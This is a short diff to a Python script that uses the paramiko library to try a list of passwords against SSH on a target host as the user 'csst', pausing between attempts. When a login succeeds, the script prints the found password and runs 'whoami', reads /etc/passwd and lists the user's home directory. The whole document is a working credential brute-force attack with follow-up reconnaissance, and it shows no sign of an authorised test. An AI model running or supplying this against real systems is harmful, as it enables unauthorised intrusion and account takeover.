@@ -25,4 +25,19 @@ print(f"Test SSH {USER}@{HOST}\n")
 for pwd in passwords:
     try:
         client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPol
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.connect(HOST, 22, username=USER,
+                      password=pwd, timeout=5,
+                      look_for_keys=False,
+                      allow_agent=False)
+        print(f"\n[TROUVE !!!] csst:{pwd}")
+        stdin, stdout, stderr = client.exec_command(
+            "whoami && cat /etc/passwd | grep csst && ls /home/csst/")
+        print(stdout.read().decode())
+        client.close()
+        break
+    except paramiko.AuthenticationException:
+        print(f"[FAIL] {pwd}")
+    except Exception as e:
+        print(f"[ERR] {e}")
+    time.sleep(1.5)
